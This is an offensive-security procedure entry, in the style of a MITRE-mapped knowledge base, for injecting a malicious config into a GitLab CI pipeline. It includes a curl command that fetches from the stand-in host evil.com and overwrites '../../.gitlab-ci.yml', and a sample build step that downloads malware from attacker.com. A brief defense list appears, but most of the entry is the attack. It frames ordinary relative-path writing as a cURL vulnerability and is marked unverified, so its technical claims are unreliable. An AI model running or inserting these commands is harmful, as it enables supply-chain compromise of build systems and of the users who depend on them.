---
tags:
  - supply-chain
  - ci-cd
  - config-injection
type: procedure
tools:
  - '[[tools/cURL]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/curl-gitlab-ci-overwrite]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Supply Chain Compromise]]'
updated_at: '2025-12-14T17:26:12.455Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: cd7bf575-055a-48d7-b581-efb04ff33fa2
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Supply Chain Compromise]]'
---
# Inject-Malicious-Config-in-CI-CD-Pipeline-via-cURL

## Summary

This procedure exploits cURL path traversal in automated CI/CD scripts to overwrite configuration files like .gitlab-ci.yml, injecting malicious payloads into the build pipeline.

## Description

In scripted environments (e.g., GitLab CI), a curl command with traversal in -o can target parent directories. Target: Linux CI runners with vulnerable cURL. Outcomes: Pipeline executes attacker code, compromising supply chain.

## Requirements

1. Access to run curl in CI script
2. Attacker server at http://evil.com/ hosting malicious YAML
3. Working directory in CI allowing traversal to repo root

## Defense

Defensive measures and detection strategies:

- Validate cURL -o paths in CI scripts; use absolute paths
- Use signed commits and pipeline approvals
- Monitor CI logs for suspicious curl downloads and file writes
- Isolate CI runners with network restrictions

## Objectives

1. Overwrite CI/CD config with malicious content
2. Inject payloads into automated builds
3. Compromise supply chain for broader impact

## Instructions

### Step 1: Host Malicious Config

**Context**: Prepare evil.com with YAML like 'build: - curl attacker.com/malware'.

### Step 2: Execute in Pipeline Script

**Context**: Add to CI job or run manually.

**Command** ([[commands/curl-gitlab-ci-overwrite]]):

```bash
curl http://evil.com/ -o "../../.gitlab-ci.yml"
```

> Overwrites .gitlab-ci.yml. Expected: Config updated; next pipeline run injects payload.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Supply Chain Compromise]] Supply Chain Compromise

### Sub-Techniques


## Commands Used

- [[commands/curl-gitlab-ci-overwrite]]

## Tools Used

- [[tools/cURL]]

## Tags

- supply-chain
- ci-cd
- config-injection
